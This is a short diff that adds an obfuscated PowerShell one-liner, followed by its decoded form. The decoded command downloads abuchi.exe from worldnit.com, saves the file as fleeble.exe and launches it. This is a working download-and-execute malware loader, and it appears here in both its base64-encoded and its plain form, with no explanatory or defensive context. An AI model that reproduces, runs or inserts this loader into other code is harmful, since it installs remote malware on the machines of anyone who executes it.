@@ -1,0 +1,7 @@
+iex([SYStem.text.encodiNG]::utF8.GetSTrIng([SystEm.convERT]::FROMBaSe64StrINg('CihOZXctT2JqZWN0IHNZU1RFbS5ORXQud2VCY0xpZW5UKS5kT3duTE9hRGZpbGUoJ2h0dHA6Ly93b3JsZG5pdC5jb20vYWJ1Y2hpLmV4ZScsJ2ZsZWVibGUuZXhlJyk7U3RhcnQtUHJvY2VzcyAnZmxlZWJsZS5leGUnCgo=')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object sYSTEm.NEt.weBcLienT).dOwnLOaDfile('http://worldnit.com/abuchi.exe','fleeble.exe');Start-Process 'fleeble.exe'
+
